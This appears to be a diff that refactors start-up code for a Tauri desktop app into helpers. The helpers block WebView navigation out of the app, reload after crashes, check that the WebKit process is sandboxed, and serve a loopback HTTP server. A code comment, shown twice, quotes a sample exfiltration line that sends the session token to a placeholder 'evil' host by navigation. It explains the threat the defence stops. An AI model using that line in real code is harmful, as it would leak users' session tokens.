@@ -162,6 +162,176 @@ fn register_builtins(registry: &CommandRegistry) {
 }
 
 /// Builds and runs the Tauri application; blocks until the window closes.
+/// Closes the two holes a fresh WebView leaves open, on the one platform whose
+/// WebView we can reach into.
+///
+/// Navigation, first: the CSP stops the web realm from *fetching* anything
+/// remote, but no CSP directive governs navigation — a `location.href =
+/// 'https://evil/?' + token` would still leave, carrying the session token in
+/// the URL. Any navigation outside the app's own origins is refused, so the
+/// WebView has no route to the internet at all.
+///
+/// Crash recovery, second: the shell and every panel share one web process, so a
+/// WebKit crash (a GStreamer failure in a media pipeline, say) would leave the
+/// window frozen on its last frame. Rust owns all canonical state, so reloading
+/// the shell loses nothing — but a second crash shortly after a reload means the
+/// reload re-triggers it, so we stop there rather than loop.
+#[cfg(target_os = "linux")]
+fn harden_webview(tauri_app: &tauri::App) {
+    if let Some(window) = tauri::Manager::get_webview_window(tauri_app, "main") {
+        let _ = window.with_webview(|webview| {
+            use webkit2gtk::glib::object::Cast;
+            use webkit2gtk::{
+                NavigationPolicyDecisionExt, PolicyDecisionExt, PolicyDecisionType, URIRequestExt,
+                WebViewExt,
+            };
+
+            // The CSP stops the web realm from *fetching* anything
+            // remote, but no CSP directive governs navigation: a
+            // `location.href = 'https://evil/?' + token` would still
+            // leave, carrying the session token in the URL. Refuse any
+            // navigation outside the app's own origins, so the WebView
+            // has no route to the internet at all.
+            webview.inner().connect_decide_policy(|_webview, decision, kind| {
+                if !matches!(
+                    kind,
+                    PolicyDecisionType::NavigationAction | PolicyDecisionType::NewWindowAction
+                ) {
+                    return false; // a response decision: not ours
+                }
+                let uri = decision
+                    .clone()
+                    .downcast::<webkit2gtk::NavigationPolicyDecision>()
+                    .ok()
+                    .and_then(|navigation| navigation.navigation_action())
+                    .and_then(|action| action.request())
+                    .and_then(|request| request.uri())
+                    .map(|uri| uri.to_string());
+                // An unreadable target is refused, like a remote one.
+                let allowed = uri.as_deref().map(sandbox::is_local_navigation).unwrap_or(false);
+                if !allowed {
+                    eprintln!(
+                        "metafolder-gui: blocked a navigation out of the app: {}",
+                        uri.as_deref().unwrap_or("<unreadable>")
+                    );
+                    decision.ignore();
+                    return true; // handled: the navigation is dropped
+                }
+                false
+            });
+
+            // The web process is confined by WEBKIT_FORCE_SANDBOX, set
+            // in `sandbox::preflight`. Not by
+            // `WebContext::set_sandbox_enabled`: by the time Tauri hands
+            // us the webview the web process is already running, and
+            // WebKit aborts the app ("sandboxing cannot be changed after
+            // subprocesses were spawned"). The env var is read earlier,
+            // when the process is spawned.
+            let last_crash = std::cell::Cell::new(None::<std::time::Instant>);
+            webview.inner().connect_web_process_terminated(move |webview, reason| {
+                let now = std::time::Instant::now();
+                let rapid = last_crash
+                    .get()
+                    .is_some_and(|previous| now - previous < std::time::Duration::from_secs(10));
+                last_crash.set(Some(now));
+                if rapid {
+                    eprintln!(
+                        "metafolder-gui: web process terminated again \
+                             ({reason:?}); not reloading (crash loop)"
+                    );
+                    return;
+                }
+                eprintln!(
+                    "metafolder-gui: web process terminated ({reason:?}); \
+                         reloading the shell"
+                );
+                webview.reload();
+            });
+        });
+    }
+}
+
+/// Checks, once the WebView has had time to spawn its web process, that the
+/// process really is confined.
+///
+/// Enabling the sandbox is one thing; being confined is another. If the web
+/// process shares our namespaces, a crafted image or video would be decoded with
+/// our privileges — so we refuse to keep running rather than present a window
+/// that looks safe. An inconclusive probe (no web process found, unreadable
+/// namespace) says nothing and is ignored.
+#[cfg(target_os = "linux")]
+fn spawn_confinement_probe(allow_unsandboxed: bool) {
+    std::thread::spawn(move || {
+        std::thread::sleep(std::time::Duration::from_secs(5));
+        if allow_unsandboxed {
+            return;
+        }
+        if sandbox::web_process_status() == sandbox::WebProcess::Unconfined {
+            eprintln!(
+                "metafolder-gui: WebKit's web process is not sandboxed — it would \
+                 decode untrusted media (images, video) with your full privileges. \
+                 Refusing to run."
+            );
+            std::process::exit(1);
+        }
+    });
+}
+
+/// Polls the daemon for reachability and drains its diagnostics feed
+/// (spec-gui "Connection to the daemon").
+fn spawn_health_polling(
+    daemon: Arc<daemon_proxy::DaemonProxy>,
+    gui: Arc<GuiState>,
+    interval: std::time::Duration,
+) {
+    tauri::async_runtime::spawn(async move {
+        loop {
+            // Only drain diagnostics from a daemon we can reach; a failed probe
+            // would only produce a failed feed request.
+            if daemon.check_health(&gui).await {
+                daemon.drain_diagnostics(&gui).await;
+            }
+            tokio::time::sleep(interval).await;
+        }
+    });
+}
+
+/// Serves panel assets, `/fsraw` and the scripting API on the loopback port.
+///
+/// The port is fixed by `config.toml` (the CLI reads the same file), so a
+/// failure to bind it is reported and left at that — there is no fallback port
+/// to move to, and nothing to write it down in.
+fn spawn_http_server(state: server::ServerState, token: Arc<str>, port: u16) {
+    tauri::async_runtime::spawn(async move {
+        let router = server::build_router_authenticated(state, token);
+        let address = std::net::SocketAddr::from(([127, 0, 0, 1], port));
+        match tokio::net::TcpListener::bind(address).await {
+            Ok(listener) => {
+                if let Err(error) = axum::serve(listener, router).await {
+                    eprintln!("metafolder-gui: HTTP server failed: {error}");
+                }
+            }
+            Err(error) => eprintln!("metafolder-gui: cannot bind 127.0.0.1:{port}: {error}"),
+        }
+    });
+}
+
+/// The value, or a fatal exit printing the error.
+///
+/// Every start-up step below takes this shape: the configuration is installed by
+/// `metafolder-sync-config`, and a missing or invalid piece of it has no usable
+/// fallback (spec-config "No runtime fallback"). Refusing to start says so once,
+/// where a default would hide it until something behaved oddly hours later.
+fn or_exit<T, E: std::fmt::Display>(result: Result<T, E>) -> T {
+    match result {
+        Ok(value) => value,
+        Err(error) => {
+            eprintln!("metafolder-gui: {error}");
+            std::process::exit(1);
+        }
+    }
+}
+
 pub fn run(options: Options) {
     // Untrusted media (any image or video the panels display, thumbnail or
     // probe) is decoded by C libraries with a long history of memory-safety
@@ -189,32 +359,14 @@ pub fn run(options: Options) {
     register_builtins(&registry);
     // The configuration is installed by `metafolder-sync-config`; a missing or
     // invalid file is fatal (spec-config "No runtime fallback").
-    let keybindings = match config.load_keybindings() {
-        Ok(keybindings) => keybindings,
-        Err(error) => {
-            eprintln!("metafolder-gui: {error}");
-            std::process::exit(1);
-        }
-    };
+    let keybindings = or_exit(config.load_keybindings());
     // The simplified-query grammar (shared, in core): expansion is done locally
     // by the GUI backend, never proxied to the daemon (spec-query).
-    let (grammar, grammar_source) = match metafolder_core::simplified::load::load_source() {
-        Ok(pair) => pair,
-        Err(error) => {
-            eprintln!("metafolder-gui: {error}");
-            std::process::exit(1);
-        }
-    };
+    let (grammar, grammar_source) = or_exit(metafolder_core::simplified::load::load_source());
 
     // GUI settings (config.toml), with the CLI flags as optional overrides.
     // A missing config file is fatal (spec-config "No runtime fallback").
-    let gui_config = match config.load_config() {
-        Ok(gui_config) => gui_config,
-        Err(error) => {
-            eprintln!("metafolder-gui: {error}");
-            std::process::exit(1);
-        }
-    };
+    let gui_config = or_exit(config.load_config());
     let gui_port = options.gui_port.unwrap_or(gui_config.gui_port);
     let page_sizes = gui_config.page_size.clone();
     let picker_seeds = gui_config.picker_seeds.clone();
@@ -236,13 +388,11 @@ pub fn run(options: Options) {
 
     // Session token (spec-auth): gates the GUI server's sensitive routes and
     // is handed to the WebView through the initial state.
-    let gui_token: Arc<str> = match metafolder_core::auth::ensure_token("gui") {
-        Ok(token) => token.into(),
-        Err(error) => {
-            eprintln!("metafolder-gui: cannot establish the session token: {error}");
-            std::process::exit(1);
-        }
-    };
+    let gui_token: Arc<str> = or_exit(
+        metafolder_core::auth::ensure_token("gui")
+            .map_err(|error| format!("cannot establish the session token: {error}")),
+    )
+    .into();
 
     tauri::Builder::default()
         .setup(move |tauri_app| {
@@ -284,155 +434,28 @@ pub fn run(options: Options) {
             });
             tauri::Manager::manage(tauri_app, app);
 
-            // A WebKit web-process crash (e.g. a GStreamer failure in a
-            // media pipeline) would otherwise leave the window frozen on its
-            // last frame: the shell and every panel (same realm) share that
-            // single process. Reload the shell instead — Rust owns all
-            // canonical state, so nothing is lost. A second crash shortly
-            // after a reload means reloading re-triggers it: stop there
-            // rather than loop.
+            // The WebView is not safe as handed to us: it can navigate out of the
+            // app, and a web-process crash freezes the window.
             #[cfg(target_os = "linux")]
-            if let Some(window) = tauri::Manager::get_webview_window(tauri_app, "main") {
-                let _ = window.with_webview(|webview| {
-                    use webkit2gtk::glib::object::Cast;
-                    use webkit2gtk::{
-                        NavigationPolicyDecisionExt, PolicyDecisionExt, PolicyDecisionType,
-                        URIRequestExt, WebViewExt,
-                    };
+            harden_webview(tauri_app);
 
-                    // The CSP stops the web realm from *fetching* anything
-                    // remote, but no CSP directive governs navigation: a
-                    // `location.href = 'https://evil/?' + token` would still
-                    // leave, carrying the session token in the URL. Refuse any
-                    // navigation outside the app's own origins, so the WebView
-                    // has no route to the internet at all.
-                    webview.inner().connect_decide_policy(|_webview, decision, kind| {
-                        if !matches!(
-                            kind,
-                            PolicyDecisionType::NavigationAction
-                                | PolicyDecisionType::NewWindowAction
-                        ) {
-                            return false; // a response decision: not ours
-                        }
-                        let uri = decision
-                            .clone()
-                            .downcast::<webkit2gtk::NavigationPolicyDecision>()
-                            .ok()
-                            .and_then(|navigation| navigation.navigation_action())
-                            .and_then(|action| action.request())
-                            .and_then(|request| request.uri())
-                            .map(|uri| uri.to_string());
-                        // An unreadable target is refused, like a remote one.
-                        let allowed =
-                            uri.as_deref().map(sandbox::is_local_navigation).unwrap_or(false);
-                        if !allowed {
-                            eprintln!(
-                                "metafolder-gui: blocked a navigation out of the app: {}",
-                                uri.as_deref().unwrap_or("<unreadable>")
-                            );
-                            decision.ignore();
-                            return true; // handled: the navigation is dropped
-                        }
-                        false
-                    });
-
-                    // The web process is confined by WEBKIT_FORCE_SANDBOX, set
-                    // in `sandbox::preflight`. Not by
-                    // `WebContext::set_sandbox_enabled`: by the time Tauri hands
-                    // us the webview the web process is already running, and
-                    // WebKit aborts the app ("sandboxing cannot be changed after
-                    // subprocesses were spawned"). The env var is read earlier,
-                    // when the process is spawned.
-                    let last_crash = std::cell::Cell::new(None::<std::time::Instant>);
-                    webview.inner().connect_web_process_terminated(move |webview, reason| {
-                        let now = std::time::Instant::now();
-                        let rapid = last_crash.get().is_some_and(|previous| {
-                            now - previous < std::time::Duration::from_secs(10)
-                        });
-                        last_crash.set(Some(now));
-                        if rapid {
-                            eprintln!(
-                                "metafolder-gui: web process terminated again \
-                                     ({reason:?}); not reloading (crash loop)"
-                            );
-                            return;
-                        }
-                        eprintln!(
-                            "metafolder-gui: web process terminated ({reason:?}); \
-                                 reloading the shell"
-                        );
-                        webview.reload();
-                    });
-                });
-            }
-
-            // Enabling the sandbox is one thing; being confined is another.
-            // Once WebKit has spawned its web process, check the process
-            // itself: if it shares our namespaces, a crafted image or video
-            // would be decoded with our privileges, so refuse to keep running
-            // rather than present a window that looks safe. An inconclusive
-            // probe (no web process found, unreadable namespace) says nothing
-            // and is ignored.
             #[cfg(target_os = "linux")]
-            let allow_unsandboxed = options.allow_unsandboxed_webview;
-            #[cfg(target_os = "linux")]
-            std::thread::spawn(move || {
-                std::thread::sleep(std::time::Duration::from_secs(5));
-                if allow_unsandboxed {
-                    return;
-                }
-                if sandbox::web_process_status() == sandbox::WebProcess::Unconfined {
-                    eprintln!(
-                        "metafolder-gui: WebKit's web process is not sandboxed — it would \
-                         decode untrusted media (images, video) with your full privileges. \
-                         Refusing to run."
-                    );
-                    std::process::exit(1);
-                }
-            });
-
-            // Daemon health polling (spec-gui "Connection to the daemon").
-            let poll_daemon = daemon.clone();
-            let poll_gui = gui.clone();
-            tauri::async_runtime::spawn(async move {
-                loop {
-                    // Only drain diagnostics from a daemon we can reach; a
-                    // failed probe would only produce a failed feed request.
-                    if poll_daemon.check_health(&poll_gui).await {
-                        poll_daemon.drain_diagnostics(&poll_gui).await;
-                    }
-                    tokio::time::sleep(health_poll_interval).await;
-                }
-            });
-
-            // The GUI HTTP server: panel assets, /fsraw, scripting API.
-            let server_state = server::ServerState {
-                config: config.clone(),
-                gui: gui.clone(),
-                daemon: daemon.clone(),
-                keybindings,
-                input,
-                commands: command_wait,
-                bench,
-                repo_list_cache_ttl: settings.repo_list_cache_ttl(),
-            };
-            let server_token = gui_token.clone();
-            tauri::async_runtime::spawn(async move {
-                let router = server::build_router_authenticated(server_state, server_token);
-                let address = std::net::SocketAddr::from(([127, 0, 0, 1], gui_port));
-                match tokio::net::TcpListener::bind(address).await {
-                    Ok(listener) => {
-                        // The bound port is fixed by config.toml (the CLI reads
-                        // the same file); there is no longer a gui.port file.
-                        if let Err(error) = axum::serve(listener, router).await {
-                            eprintln!("metafolder-gui: HTTP server failed: {error}");
-                        }
-                    }
-                    Err(error) => {
-                        eprintln!("metafolder-gui: cannot bind 127.0.0.1:{gui_port}: {error}")
-                    }
-                }
-            });
+            spawn_confinement_probe(options.allow_unsandboxed_webview);
+            spawn_health_polling(daemon.clone(), gui.clone(), health_poll_interval);
+            spawn_http_server(
+                server::ServerState {
+                    config: config.clone(),
+                    gui: gui.clone(),
+                    daemon: daemon.clone(),
+                    keybindings,
+                    input,
+                    commands: command_wait,
+                    bench,
+                    repo_list_cache_ttl: settings.repo_list_cache_ttl(),
+                },
+                gui_token.clone(),
+                gui_port,
+            );
             Ok(())
         })
         .on_window_event({
